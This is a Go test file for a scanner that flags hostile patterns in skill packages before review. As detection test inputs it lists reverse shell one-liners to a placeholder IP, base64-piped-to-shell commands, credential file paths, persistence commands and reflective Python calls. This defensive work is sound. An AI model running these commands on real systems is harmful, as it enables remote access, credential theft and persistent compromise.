package plugin

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"
)

func scanOne(t *testing.T, p Plugin, content string) []Issue {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "SKILL.md")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p.Scan(dir, path, content)
}

// 这些断言锁定的是规则本身：正则、阈值、行号算法和 audit_required 的口径都不能
// 漂移，否则复核阶段收到的命中集合会变。
func TestRegexPlugins(t *testing.T) {
	dir := t.TempDir()
	got := Base64ExecPlugin{}.Scan(dir, filepath.Join(dir, "SKILL.md"), "line1\nbase64 -D payload | bash\n")
	if len(got) != 1 {
		t.Fatalf("base64 piped to shell: got %d issues", len(got))
	}
	if got[0].Severity != SeverityCritical || got[0].Category != CatRemoteExecution || !got[0].AuditRequired {
		t.Errorf("unexpected issue: %+v", got[0])
	}
	if got[0].Line != 2 {
		t.Errorf("line = %d, want 2", got[0].Line)
	}
	if got[0].FilePath != "SKILL.md" {
		t.Errorf("file_path must be relative to the skill dir, got %q", got[0].FilePath)
	}

	// --decode 长选项与大小写不敏感都要命中。
	if got := (Base64ExecPlugin{}).Scan(dir, filepath.Join(dir, "SKILL.md"), "BASE64 --DECODE x | sh"); len(got) != 1 {
		t.Errorf("long option / case-insensitive match failed: %d", len(got))
	}
	// 单纯提到 base64 不算命中。
	if got := (Base64ExecPlugin{}).Scan(dir, filepath.Join(dir, "SKILL.md"), "use base64 to encode the token"); len(got) != 0 {
		t.Errorf("plain mention must not match: %d", len(got))
	}

	reverse := ReverseShellPlugin{}
	for _, in := range []string{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc 1.2.3.4 4444 -e /bin/sh", "socat exec:/bin/sh tcp:1.2.3.4:4444"} {
		if got := scanOne(t, reverse, in); len(got) != 1 {
			t.Errorf("reverse shell pattern %q not detected", in)
		}
	}
	if got := scanOne(t, reverse, "nc -l 8080"); len(got) != 0 {
		t.Errorf("-e is required for the nc branch, got %d", len(got))
	}
}

func TestPublicIPFiltersPrivateRanges(t *testing.T) {
	p := PublicIPCheckPlugin{}

	got := scanOne(t, p, "callback to 115.191.8.8 now")
	if len(got) != 1 || got[0].Category != CatNetworkAbuse {
		t.Fatalf("public IP must be reported: %+v", got)
	}
	if got[0].Severity != SeverityMedium || !got[0].AuditRequired {
		t.Errorf("unexpected severity/audit flag: %+v", got[0])
	}

	for _, in := range []string{"10.1.2.3", "172.16.0.1", "192.168.1.1", "127.0.0.1", "169.254.1.1", "224.0.0.1", "0.0.0.0"} {
		if got := scanOne(t, p, "addr "+in); len(got) != 0 {
			t.Errorf("%s must not be reported as public", in)
		}
	}
	// 去重：同一个 IP 出现两次只报一条。
	if got := scanOne(t, p, "8.8.8.8 and 8.8.8.8"); len(got) != 1 {
		t.Errorf("duplicate IPs must collapse: %d", len(got))
	}
}

func TestCredentialPaths(t *testing.T) {
	p := CredentialPathsCheckPlugin{}

	for _, in := range []string{
		"cat ~/.ssh/id_rsa",
		"/home/alice/.aws/credentials",
		"read ~/.kube/config",
		"/etc/shadow",
		"load .env",
		"fetch secrets.yaml",
		"Google/Chrome/Default/Cookies",
		"~/.docker/config.json",
		".git-credentials",
	} {
		if got := scanOne(t, p, in); len(got) != 1 {
			t.Errorf("credential path %q must be detected, got %d", in, len(got))
		}
	}

	// 同一条规则在同一行去重。
	if got := scanOne(t, p, "cat ~/.ssh/id_rsa ~/.ssh/authorized_keys"); len(got) != 1 {
		t.Errorf("same rule on one line must collapse, got %d", len(got))
	}
	// 不同规则同行各报一条。
	if got := scanOne(t, p, "cat ~/.ssh/id_rsa /etc/shadow"); len(got) != 2 {
		t.Errorf("distinct rules on one line must both report, got %d", len(got))
	}
	if got := scanOne(t, p, "cat ~/.ssh/id_rsa"); got[0].Severity != SeverityHigh || got[0].Category != CatSensitiveFileAccess || !got[0].AuditRequired {
		t.Errorf("unexpected issue shape: %+v", got[0])
	}

	// 超长命中按字符截断到 80，不能把多字节字符切成半个码点。
	longUnicode := "Chrome/" + repeat("路径", 60) + "/Cookies"
	got := scanOne(t, p, longUnicode)
	if len(got) != 1 {
		t.Fatalf("long browser path must be detected, got %d", len(got))
	}
	if !utf8.ValidString(got[0].Description) {
		t.Errorf("truncated description must stay valid UTF-8: %q", got[0].Description)
	}
	// 只数括号内的命中文本："References <label> (<text>)."
	start := strings.LastIndex(got[0].Description, "(")
	end := strings.LastIndex(got[0].Description, ")")
	if start < 0 || end < start {
		t.Fatalf("description must quote the matched text: %q", got[0].Description)
	}
	matched := strings.TrimSuffix(got[0].Description[start+1:end], "...")
	if n := len([]rune(matched)); n > 80 {
		t.Errorf("matched text must cap at 80 runes, got %d", n)
	}

	// 同前缀但无害的文件名、无路径语义的词都不能命中。
	for _, in := range []string{
		".envrc",
		".env.example",
		"plain ssh key mention",
		"docs/Cookies.md",
		"use the AWS console",
		"scp file to remote",
	} {
		if got := scanOne(t, p, in); len(got) != 0 {
			t.Errorf("%q must not be flagged, got %d", in, len(got))
		}
	}
}

func TestPersistenceMechanisms(t *testing.T) {
	p := PersistenceMechanismsCheckPlugin{}

	for _, in := range []string{
		"(crontab -l) 2>/dev/null",
		"echo '* * * * * cmd' | crontab -",
		"/etc/cron.daily/backup",
		"echo 'alias x=y' >> ~/.zshrc",
		"tee -a ~/.bashrc",
		"open(os.path.expanduser('~/.zshrc'), 'a')",
		"systemctl --user enable evil.service",
		"cp agent.plist ~/Library/LaunchAgents/",
		"launchctl load ~/Library/LaunchAgents/com.x.plist",
		"~/.config/autostart/evil.desktop",
		"schtasks /create /tn updater",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	} {
		if got := scanOne(t, p, in); len(got) != 1 {
			t.Errorf("persistence pattern %q must be detected, got %d", in, len(got))
		}
	}

	// 同一条规则在同一行去重。
	if got := scanOne(t, p, "crontab -e; crontab -l"); len(got) != 1 {
		t.Errorf("same rule on one line must collapse, got %d", len(got))
	}
	if got := scanOne(t, p, "crontab -e"); got[0].Severity != SeverityHigh || got[0].Category != CatPersistence || !got[0].AuditRequired {
		t.Errorf("unexpected issue shape: %+v", got[0])
	}

	// 单纯读取或提及启动文件、非 enable 的 systemctl 子命令都不算。
	for _, in := range []string{
		"cat ~/.zshrc to inspect",
		"the .zshrc file documents aliases",
		"systemctl status nginx",
		"systemctl restart nginx",
	} {
		if got := scanOne(t, p, in); len(got) != 0 {
			t.Errorf("%q must not be flagged, got %d", in, len(got))
		}
	}
	// 提及 LaunchAgents 目录本身就是落点，要报。
	if got := scanOne(t, p, "drop into LaunchAgents"); len(got) != 1 {
		t.Errorf("LaunchAgents directory reference must be flagged, got %d", len(got))
	}
}

func TestReflectiveCalls(t *testing.T) {
	p := ReflectiveCallCheckPlugin{}

	for _, in := range []string{
		"getattr(os, 'system')('id')",
		"getattr(builtins, 'exec')(payload)",
		"f = getattr(subprocess, 'popen')",
		"mod = getattr(importlib, '__import__')",
		"getattr(os, env_name)",
		"importlib.import_module(plugin_name)",
		"__import__(args.module)",
		"dispatch = globals()['__builtins__']",
	} {
		if got := scanOne(t, p, in); len(got) != 1 {
			t.Errorf("reflective pattern %q must be detected, got %d", in, len(got))
		}
	}

	// 同一条规则在同一行去重。
	if got := scanOne(t, p, "getattr(os, 'system'); getattr(builtins, 'exec')"); len(got) != 1 {
		t.Errorf("same rule on one line must collapse, got %d", len(got))
	}
	// 不同规则同行各报一条。
	if got := scanOne(t, p, "getattr(os, 'system'); importlib.import_module(m)"); len(got) != 2 {
		t.Errorf("distinct rules on one line must both report, got %d", len(got))
	}
	if got := scanOne(t, p, "getattr(os, 'system')"); got[0].Severity != SeverityHigh || got[0].Category != CatObfuscation || !got[0].AuditRequired {
		t.Errorf("unexpected issue shape: %+v", got[0])
	}

	// 无害属性、字面量动态导入的直接形式都不算：本插件只抓反射写法本身。
	for _, in := range []string{
		"getattr(os, 'environ')",
		"getattr(config, 'value', None)",
		"import_module('os')",
		"__import__('json')",
		"os.system('ls')",
		"import importlib.util",
	} {
		if got := scanOne(t, p, in); len(got) != 0 {
			t.Errorf("%q must not be flagged, got %d", in, len(got))
		}
	}
}

func TestSizeAndLengthPluginsAreNotAudited(t *testing.T) {
	// audit_required=false 的命中直接进报告，不进 LLM 复核，这条口径必须保持。
	long := make([]byte, 0, 4000)
	for i := 0; i < 3001; i++ {
		long = append(long, 'a', '\n')
	}
	got := scanOne(t, LongFileCheckPlugin{}, string(long))
	if len(got) != 1 || got[0].AuditRequired {
		t.Fatalf("long file must produce exactly one non-audited issue: %+v", got)
	}
	if got := scanOne(t, LongFileCheckPlugin{}, "short\n"); len(got) != 0 {
		t.Error("short files must not be flagged")
	}

	// 阈值是 3000 行，等于阈值不算超。
	atLimit := make([]byte, 0, 3000)
	for i := 0; i < 3000; i++ {
		atLimit = append(atLimit, 'a', '\n')
	}
	if got := scanOne(t, LongFileCheckPlugin{}, string(atLimit)); len(got) != 0 {
		t.Error("exactly 3000 lines must not be flagged")
	}
}

func TestConsecutiveNewlines(t *testing.T) {
	// 判定是 content 里直接包含 "\n"*30，所以阈值按连续换行字符数算，不是空行数。
	if got := scanOne(t, ConsecutiveNewlinesCheckPlugin{}, "a"+repeat("\n", 29)+"b"); len(got) != 0 {
		t.Error("29 newlines must not trigger")
	}
	if got := scanOne(t, ConsecutiveNewlinesCheckPlugin{}, "a"+repeat("\n", 30)+"b"); len(got) != 1 {
		t.Error("30 newlines must trigger")
	}
}

func TestRareAndBinaryFiles(t *testing.T) {
	dir := t.TempDir()
	weird := filepath.Join(dir, "payload.bin")
	if err := os.WriteFile(weird, []byte{0x00, 0x01, 0x02}, 0o644); err != nil {
		t.Fatal(err)
	}
	if got := (RareFileCheckPlugin{}).Scan(dir, weird, "\x00\x01"); len(got) != 1 {
		t.Error(".bin must be a rare file")
	}
	if got := (BinaryFileCheckPlugin{}).Scan(dir, weird, "\x00\x01"); len(got) != 1 {
		t.Error("NUL byte must be detected as binary")
	}
	if got := (BinaryFileCheckPlugin{}).Scan(dir, weird, "\x00\x01"); got[0].Severity != SeverityHigh {
		t.Errorf("binary files are high severity: %+v", got[0])
	}

	// 二进制插件自己读盘判定，不用传入的 content。
	md := filepath.Join(dir, "SKILL.md")
	if err := os.WriteFile(md, []byte("# ok\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := (BinaryFileCheckPlugin{}).Scan(dir, md, "\x00\x01"); len(got) != 0 {
		t.Error("plugin must re-read the file, not trust content")
	}
}

func TestScanDirectoryIsolatesPluginFailures(t *testing.T) {
	// 一个插件 panic 不能中断整轮扫描；ScanDirectory 会把它转成一条警告。
	panicky := panickyPlugin{}
	old := registry
	registry = []Plugin{panicky, ReverseShellPlugin{}}
	defer func() { registry = old }()

	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("nc 1.2.3.4 4444 -e /bin/sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	warned := false
	SetWarnSink(func(format string, args ...any) { warned = true })
	defer SetWarnSink(nil)

	res, err := ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !warned {
		t.Error("a crashing plugin must surface a warning")
	}
	if len(res) != 1 {
		t.Fatalf("the healthy plugin must still report, got %v", res)
	}
}

type panickyPlugin struct{}

func (panickyPlugin) Meta() Meta {
	return Meta{ID: "panicky", Name: "Panicky", Description: "test-only"}
}

func (panickyPlugin) Scan(string, string, string) []Issue { panic("boom") }

func repeat(s string, n int) string {
	out := make([]byte, 0, len(s)*n)
	for i := 0; i < n; i++ {
		out = append(out, s...)
	}
	return string(out)
}

// 每个插件必须有完整的注册元数据：-plugins-list 直接把它们打印给用户，
// 空字段会显示成一行残缺的列表。
func TestEveryPluginHasCompleteMetadata(t *testing.T) {
	metas := List()
	if len(metas) != 12 {
		t.Fatalf("registry holds %d plugins, want 10", len(metas))
	}
	seen := map[string]bool{}
	for _, m := range metas {
		if m.ID == "" || m.Name == "" || m.Description == "" {
			t.Errorf("%+v: metadata fields must all be filled", m)
		}
		if seen[m.ID] {
			t.Errorf("duplicate plugin id %q", m.ID)
		}
		seen[m.ID] = true
	}
}
